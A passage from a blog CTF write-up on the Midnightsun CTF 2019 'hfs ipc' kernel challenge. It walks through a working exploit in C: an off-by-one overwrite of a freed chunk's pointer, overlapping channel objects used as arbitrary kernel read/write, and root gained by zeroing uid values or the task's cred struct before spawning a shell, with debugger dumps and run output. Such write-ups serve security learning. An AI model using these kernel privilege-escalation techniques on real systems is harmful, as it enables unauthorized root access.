<span class="n">delete_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffff8800001c6460
0xffff8800001c6460:	0x0000000000000001	0xffff8800001c6480  &lt;== Channel 1 Object
0xffff8800001c6470:	0x0000000000000020	0xff5dc125f80330ca
0xffff8800001c6480:	0x0000000000000000	0x0000000000000000  &lt;== Channel 1 Buffer
0xffff8800001c6490:	0x0000000000000000	0x0000000000000000
0xffff8800001c64a0:	0x0000000000000002	0xffff8800001c64c0  &lt;== Channel 2 Object
0xffff8800001c64b0:	0x0000000000000020	0x1a512b6f8988c807
0xffff8800001c64c0:	0x0000000000000000	0x0000000000000000  &lt;== Channel 2 Buffer
0xffff8800001c64d0:	0x0000000000000000	0x0000000000000000
0xffff8800001c64e0:	0xffff8800001c6500	0xffff8800001c6500  &lt;== Channel 3 Object (freed)
0xffff8800001c64f0:	0x0000000000000020	0xe5f716d6aa5fdd5d
0xffff8800001c6500:	0xffff8800001c65e0	0x0000000000000000  &lt;== Channel 3 Buffer (freed)
0xffff8800001c6510:	0x0000000000000000	0x0000000000000000
0xffff8800001c6520:	0x0000000000000004	0xffff8800001c6540  &lt;== Channel 4 Object
0xffff8800001c6530:	0x0000000000000020	0xd0225688dc121d8c
0xffff8800001c6540:	0x0000000000000000	0x0000000000000000  &lt;== Channel 4 Buffer
0xffff8800001c6550:	0x0000000000000000	0x0000000000000000
0xffff8800001c6560:	0x0000000000000005	0xffff8800001c6580
0xffff8800001c6570:	0x0000000000000020	0xea425c6d881bfa1c
0xffff8800001c6580:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Now the channel object and the buffer for it is freed, and the <code class="language-plaintext highlighter-rouge">FD</code> of the channel 3 object points to the also freed <code class="language-plaintext highlighter-rouge">buffer</code>.</p>

<p>We can now leverage the <code class="language-plaintext highlighter-rouge">off by one</code> overwrite, to overflow from channel 2 buffer into the LSB of the <code class="language-plaintext highlighter-rouge">FD</code> for channel 3, letting it pointing slightly somewhere else (for example into the channel 4 buffer)</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">payload</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Overwrite LSB of channel 3 FD</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffff8800001c6460
0xffff8800001c6460:	0x0000000000000001	0xffff8800001c6480  &lt;== Channel 1 Object
0xffff8800001c6470:	0x0000000000000020	0xff5dc125f80330ca
0xffff8800001c6480:	0x0000000000000000	0x0000000000000000  &lt;== Channel 1 Buffer
0xffff8800001c6490:	0x0000000000000000	0x0000000000000000
0xffff8800001c64a0:	0x0000000000000002	0xffff8800001c64c0  &lt;== Channel 2 Object
0xffff8800001c64b0:	0x0000000000000020	0x1a512b6f8988c807
0xffff8800001c64c0:	0x4141414141414141	0x4141414141414141  &lt;== Channel 2 Buffer
0xffff8800001c64d0:	0x4141414141414141	0x4141414141414141
0xffff8800001c64e0:	0xffff8800001c6540	0xffff8800001c6500  &lt;== Channel 3 Object (freed) FD pointing to Channel 4 buffer)
0xffff8800001c64f0:	0x0000000000000020	0xe5f716d6aa5fdd5d
0xffff8800001c6500:	0xffff8800001c65e0	0x0000000000000000  &lt;== Channel 3 Buffer (freed)
0xffff8800001c6510:	0x0000000000000000	0x0000000000000000
0xffff8800001c6520:	0x0000000000000004	0xffff8800001c6540  &lt;== Channel 4 Object
0xffff8800001c6530:	0x0000000000000020	0xd0225688dc121d8c
0xffff8800001c6540:	0x0000000000000000	0x0000000000000000  &lt;== Channel 4 Buffer</code></pre></figure>

<p>Starts looking interesting. Recreating channel 3 with a different chunk size now will allocate the freed Channel 3 Object again to hold the new channel object and since we use a different size, the data buffer will be allocated “somewhere else”.</p>

<p>Though the next channel we will create after that, will use the corrupted <code class="language-plaintext highlighter-rouge">FD</code> and <code class="language-plaintext highlighter-rouge">kalloc</code> will think, it should be allocated to <code class="language-plaintext highlighter-rouge">0xffff8800001c6540</code>, which happens to be also the <code class="language-plaintext highlighter-rouge">data buffer</code> for channel 4.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Recreate channel 3 (with different chunk size)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create next channel (inside channel 4 data)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffff8800001c6460
0xffff8800001c6460:	0x0000000000000001	0xffff8800001c6480  &lt;== Channel 1 Object
0xffff8800001c6470:	0x0000000000000020	0xff5dc125f80330ca
0xffff8800001c6480:	0x0000000000000000	0x0000000000000000  &lt;== Channel 1 Buffer
0xffff8800001c6490:	0x0000000000000000	0x0000000000000000
0xffff8800001c64a0:	0x0000000000000002	0xffff8800001c64c0  &lt;== Channel 2 Object
0xffff8800001c64b0:	0x0000000000000020	0x1a512b6f8988c807
0xffff8800001c64c0:	0x4141414141414141	0x4141414141414141  &lt;== Channel 2 Buffer
0xffff8800001c64d0:	0x4141414141414141	0x4141414141414141
0xffff8800001c64e0:	0x0000000000000008	0xffff8800001b2c40  &lt;== Channel 8 Object (formerly Channel 3 Object)
0xffff8800001c64f0:	0x0000000000000040	0xe5f716d6aa5fdd5d
0xffff8800001c6500:	0xffff8800001c65e0	0x0000000000000000  &lt;== Channel 3 Buffer (freed)
0xffff8800001c6510:	0x0000000000000000	0x0000000000000000
0xffff8800001c6520:	0x0000000000000004	0xffff8800001c6540  &lt;== Channel 4 Object
0xffff8800001c6530:	0x0000000000000020	0xd0225688dc121d8c
0xffff8800001c6540:	0x0000000000000009	0xffff8800001b2c80  &lt;== Channel 4 Buffer (and Channel 9 Object!)
0xffff8800001c6550:	0x0000000000000040	0x0000000000000000</code></pre></figure>

<p>Nice, so we now have the channel 4 buffer and the channel 9 object overlapping at <code class="language-plaintext highlighter-rouge">0xffff8800001c6540</code>.</p>

<p>We can use this now for an arbitrary read/write, by first overwriting the channel 9 object via a channel 4 write, and then use channel 9 for read or write. I used this first to leak kernel address before realizing that the challenge didn’t even had <code class="language-plaintext highlighter-rouge">kaslr</code> active…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">read_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Read data from %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>

    <span class="kt">long</span> <span class="n">pPayload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">9</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span><span class="p">};</span>

    <span class="c1">// Overwrite channel object 9</span>
    <span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">pPayload</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>

    <span class="c1">// Use channel 9 to read data</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">read_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Write data to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>

    <span class="kt">long</span> <span class="n">pPayload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">9</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span><span class="p">};</span>

    <span class="c1">// Overwrite channel object 9</span>
    <span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">pPayload</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
    
    <span class="c1">// Use channel 9 to write data</span>
    <span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Since the kernel has <code class="language-plaintext highlighter-rouge">SMAP</code> and <code class="language-plaintext highlighter-rouge">SMEP</code> active, the easiest way to get root would be to use our arbitrary write to directly overwrite <code class="language-plaintext highlighter-rouge">task_creds</code> and start up a shell.</p>

<p>To be honest, it was getting quite late at that point, and I wasted so much time trying to find <code class="language-plaintext highlighter-rouge">task_creds</code> in memory…</p>

<p>At some point, I got so desperate, that I thought “Screw it, I can read everything and write anywhere, let’s wreck havoc…” and decided to just read the complete kernel memory block and replace everything looking like the current userid (1000) ;&gt;</p>

<p>So, let’s pwn this kernel ctf ghetto style…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Just read complete region and replace everything that could be your user id ;)</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">kernel_mem</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x800000</span><span class="p">);</span>

<span class="n">read_data</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xffff880006610000</span><span class="p">,</span> <span class="n">kernel_mem</span><span class="p">,</span> <span class="mh">0x800000</span><span class="p">);</span>

<span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span> <span class="n">pPay</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">kernel_mem</span><span class="p">;</span>

<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x800000</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">pPay</span><span class="o">++</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">write_address</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xffff880006610000</span><span class="o">+</span><span class="n">i</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">);</span>
    <span class="p">}</span>        
<span class="p">}</span>

<span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span></code></pre></figure>

<p>Well, this worked out better than expected :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
[+] Opening connection to hfsipc-01.play.midnightsunctf.se on port 8192: Done
[*] Compile
[+] Upload: Done
[*] Switching to interactive mode

user@hfs:~$ $ ./bout
./bout
[+] Open hfs device
[+] Create initial channels
[+] Free channel 3
[+] Overwrite LSB of channel 3 FD
[+] Recreate channel 3 (with different chunk size)
[+] Create next channel (inside channel 4 data)
[+] Read data from 0xffff880006610000
[+] Write '0' to '0xffff88000696a8d0'
[+] Write '0' to '0xffff88000696a8e0'
[+] Write '0' to '0xffff88000696a8f0'
[+] Write '0' to '0xffff88000696a900'
[+] Write '0' to '0xffff88000696ac50'
[+] Write '0' to '0xffff88000696ac60'
[+] Write '0' to '0xffff88000696ac70'
[+] Write '0' to '0xffff88000696ac80'
[+] Write '0' to '0xffff88000696afd0'
[+] Write '0' to '0xffff88000696afe0'
[+] Write '0' to '0xffff88000696aff0'
[+] Write '0' to '0xffff88000696b000'
[+] Write '0' to '0xffff88000696b350'
[+] Write '0' to '0xffff88000696b360'
[+] Write '0' to '0xffff88000696b370'
[+] Write '0' to '0xffff88000696b380'
[+] Write '0' to '0xffff8800069ab02c'
[+] Write '0' to '0xffff8800069cd038'
[+] Write '0' to '0xffff8800069d5008'
[+] Write '0' to '0xffff8800069d500c'
[+] Write '0' to '0xffff8800069d5010'
[+] Write '0' to '0xffff8800069d5014'
[+] Write '0' to '0xffff8800069d5018'
[+] Write '0' to '0xffff8800069d501c'
[+] Write '0' to '0xffff8800069d5020'
[+] Write '0' to '0xffff8800069d5104'
[+] Write '0' to '0xffff8800069d5108'
[+] Write '0' to '0xffff8800069d510c'
[+] Write '0' to '0xffff8800069d5110'
[+] Write '0' to '0xffff8800069d5114'
[+] Write '0' to '0xffff8800069d5118'
[+] Write '0' to '0xffff8800069d511c'
[+] Write '0' to '0xffff8800069d5120'
[+] Write '0' to '0xffff8800069d5184'
[+] Write '0' to '0xffff8800069d5188'
[+] Write '0' to '0xffff8800069d518c'
[+] Write '0' to '0xffff8800069d5190'
[+] Write '0' to '0xffff8800069d5194'
[+] Write '0' to '0xffff8800069d5198'
[+] Write '0' to '0xffff8800069d519c'
[+] Write '0' to '0xffff8800069d51a0'
[+] Write '0' to '0xffff8800069d5208'
[+] Write '0' to '0xffff8800069d520c'
[+] Write '0' to '0xffff8800069d5210'
[+] Write '0' to '0xffff8800069d5214'
[+] Write '0' to '0xffff8800069d5218'
[+] Write '0' to '0xffff8800069d521c'
[+] Write '0' to '0xffff8800069d5220'
[+] Write '0' to '0xffff8800069d5288'
[+] Write '0' to '0xffff8800069d528c'
[+] Write '0' to '0xffff8800069d5290'
[+] Write '0' to '0xffff8800069d5294'
[+] Write '0' to '0xffff8800069d5298'
[+] Write '0' to '0xffff8800069d529c'
[+] Write '0' to '0xffff8800069d52a0'
[+] Write '0' to '0xffff8800069d5304'
[+] Write '0' to '0xffff8800069d5308'
[+] Write '0' to '0xffff8800069d530c'
[+] Write '0' to '0xffff8800069d5310'
[+] Write '0' to '0xffff8800069d5314'
[+] Write '0' to '0xffff8800069d5318'
[+] Write '0' to '0xffff8800069d531c'
[+] Write '0' to '0xffff8800069d5320'
[+] Write '0' to '0xffff8800069d5388'
[+] Write '0' to '0xffff8800069d538c'
[+] Write '0' to '0xffff8800069d5390'
[+] Write '0' to '0xffff8800069d5394'
[+] Write '0' to '0xffff8800069d5398'
[+] Write '0' to '0xffff8800069d539c'
[+] Write '0' to '0xffff8800069d53a0'
[+] Write '0' to '0xffff8800069d5408'
[+] Write '0' to '0xffff8800069d540c'
[+] Write '0' to '0xffff8800069d5410'
[+] Write '0' to '0xffff8800069d5414'
[+] Write '0' to '0xffff8800069d5418'
[+] Write '0' to '0xffff8800069d541c'
[+] Write '0' to '0xffff8800069d5420'
[+] Write '0' to '0xffff8800069d5484'
[+] Write '0' to '0xffff8800069d5488'
[+] Write '0' to '0xffff8800069d548c'
[+] Write '0' to '0xffff8800069d5490'
[+] Write '0' to '0xffff8800069d5494'
[+] Write '0' to '0xffff8800069d5498'
[+] Write '0' to '0xffff8800069d549c'
[+] Write '0' to '0xffff8800069d54a0'
[+] Write '0' to '0xffff880006ca4ec4'
[+] Write '0' to '0xffff880006cb3a68'
[+] Write '0' to '0xffff880006d11764'
[+] Write '0' to '0xffff880006d2b1d4'
[+] Write '0' to '0xffff880006d2bc18'
[+] Write '0' to '0xffff880006d45c14'
[+] Write '0' to '0xffff880006d4dda8'
[+] Write '0' to '0xffff880006d95474'
[+] Write '0' to '0xffff880006db0d34'
[+] Write '0' to '0xffff880006db1b98'
[+] Write '0' to '0xffff880006db1bac'
[+] Write '0' to '0xffff880006dba68c'
[+] Write '0' to '0xffff880006dbabec'
[+] Write '0' to '0xffff880006dc731c'
[+] Write '0' to '0xffff880006dc9ae0'
[+] Write '0' to '0xffff880006dd897c'
root@hfs:/home/user$ $ id
id
uid=0(root) gid=0(root) groups=1000(user)
root@hfs:/home/user$ $ cd /root
cd /root
root@hfs:~$ $ ls
ls
flag
root@hfs:~$ $ cat flag
cat flag
midnight{0fF_bY_0n}
root@hfs:~$ $  </code></pre></figure>

<p>It was around 05:00am then, so I really needed to get some sleep after submitting the flag.</p>

<p>Though <code class="language-plaintext highlighter-rouge">mementomori</code> came up with a proper way of leaking <code class="language-plaintext highlighter-rouge">task_creds</code> the next day, so I’ll also include that here for later (might come in handy)</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define INIT_TASK 0xffffffff81a1b4c0
#define OFFSET_TASKS 0x1d0
#define OFFSET_PID 0x278
#define OFFSET_CRED 0x3c0
</span>
<span class="p">...</span>

<span class="kt">long</span> <span class="n">task</span> <span class="o">=</span> <span class="n">INIT_TASK</span><span class="p">;</span>

<span class="k">while</span><span class="p">((</span><span class="n">task</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">task</span> <span class="o">+</span> <span class="n">OFFSET_TASKS</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="n">OFFSET_TASKS</span><span class="p">)</span> <span class="o">!=</span> <span class="n">INIT_TASK</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">task</span> <span class="o">+</span> <span class="n">OFFSET_PID</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"task = %p, pid = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">task</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">!=</span> <span class="n">getpid</span><span class="p">())</span> 
        <span class="k">continue</span><span class="p">;</span>        

    <span class="n">puts</span><span class="p">(</span><span class="s">"found current task!"</span><span class="p">);</span>

    <span class="kt">long</span> <span class="n">cred</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">task</span> <span class="o">+</span> <span class="n">OFFSET_CRED</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">write_address</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">cred</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">break</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>which will result in less writes</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
[+] Starting local process './chall': pid 5692
[5692]
[*] Paused (press any to continue)
[*] Compile
[+] Upload: Done
[*] Switching to interactive mode
$ ./bout
[+] Open hfs device
[+] Create initial channels
[+] Free channel 3
[+] Overwrite LSB of channel 3 FD
[+] Recreate channel 3 (with different chunk size)
[+] Create next channel (inside channel 4 data)
[+] Read address from 0xffffffff81a1b698
[+] Read data from 0xffffffff81a1b698
[+] Read address from 0xffff880006a10278
[+] Read data from 0xffff880006a10278
task = 0xffff880006a10000, pid = 494
found current task!
[+] Read address from 0xffff880006a103c0
[+] Read data from 0xffff880006a103c0
[+] Write '0' to '0xffff8800069f5400'
[+] Write '0' to '0xffff8800069f5404'
[+] Write '0' to '0xffff8800069f5408'
[+] Write '0' to '0xffff8800069f540c'
[+] Write '0' to '0xffff8800069f5410'
root@hfs:/home/user$ $  id
uid=0(root) gid=0(root) egid=1000(user) groups=1000(user)</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=Midnightsun CTF 2019 - hfs ipc&amp;url=https://kileak.github.io/ctf/2019/midnight-hfsipc/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/midnight-hfsipc/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2019/midnight-hfsipc';
        var disqus_title = 'Midnightsun CTF 2019 - hfs ipc';
        var disqus_url = 'https://kileak.github.io/ctf/2019/midnight-hfsipc';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
